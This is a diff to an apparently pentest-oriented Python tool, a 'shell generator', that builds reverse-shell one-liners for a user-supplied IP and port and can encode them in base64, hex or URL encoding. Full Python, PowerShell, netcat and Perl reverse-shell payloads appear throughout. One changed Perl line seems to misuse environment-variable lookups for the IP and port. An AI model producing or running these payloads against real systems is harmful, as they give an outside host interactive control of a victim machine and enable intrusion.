@@ -54,6 +54,7 @@ class Python(Encode):
         self.__payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.__ip}\",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
         super().__init__(self.__payload)
 
+
 class Powershell(Encode):
 
     def __init__(self:object,ip:str,porta:str):
@@ -61,6 +62,7 @@ class Powershell(Encode):
         self.__porta = porta
         self.__payload = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"+self.__ip+"',"+self.__porta+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
         super().__init__(self.__payload)
+
 
 class Netcat(Encode):
     
@@ -70,20 +72,24 @@ class Netcat(Encode):
         self.__payload = f"nc -vn {self.__ip} {self.__porta} -e \"/bin/bash\""
         super().__init__(self.__payload)
 
-Class Perl(Encode):
+
+class Perl(Encode):
     def __init__(self:object,ip:str,porta:str):
         self.__ip = ip
         self.__porta = porta
-        self.__payload = f"perl -e 'use Socket;$i=\"{self.__ip}\";$p={self.__porta};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+        self.__payload = "perl -e 'use Socket;$i=\"$ENV{"+self.__ip+"}"+";$p=$ENV{"+self.__porta+"};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
         super().__init__(self.__payload)
 
-parser = argparse.ArgumentParser(prog=banner(),usage="python3 shell.py -ip 192.168.4.80 -port 4444 -payload bash -encode urlencode")
-parser.add_argument('--version',action='version', version='shell_generator_2.0')
-parser.add_argument("-ip",type=str, dest="ip",action="store",help="Insert ip",required=True)
-parser.add_argument("-port",type=str,dest="porta",action="store",help="Insert port",required=True)
-parser.add_argument("-payload",type=str,dest="payload",action="store",choices=["bash","python","powershell","nc","php","perl","ruby","telnet","xterm","mkfifo","java","golang"],help="Insert payload",required=True)
-parser.add_argument("-encode",type=str,dest="encode",action="store",choices=['base64',"hex","urlencode"],help="Insert encode",default=None)
-args = parser.parse_args()
+
+class Argumentos():
+    global args
+    parser = argparse.ArgumentParser(prog=banner(),usage="python3 shell.py -ip 192.168.4.80 -port 4444 -payload bash -encode urlencode")
+    parser.add_argument('--version',action='version', version='shell_generator_2.0')
+    parser.add_argument("-ip",type=str, dest="ip",action="store",help="Insert ip",required=True)
+    parser.add_argument("-port",type=str,dest="porta",action="store",help="Insert port",required=True)
+    parser.add_argument("-payload",type=str,dest="payload",action="store",choices=["bash","python","powershell","nc","php","perl","ruby","telnet","xterm","mkfifo","java","golang"],help="Insert payload",required=True)
+    parser.add_argument("-encode",type=str,dest="encode",action="store",choices=['base64',"hex","urlencode"],help="Insert encode",default=None)
+    args = parser.parse_args()
 
 if __name__ == "__main__":
     if args.payload == "bash":
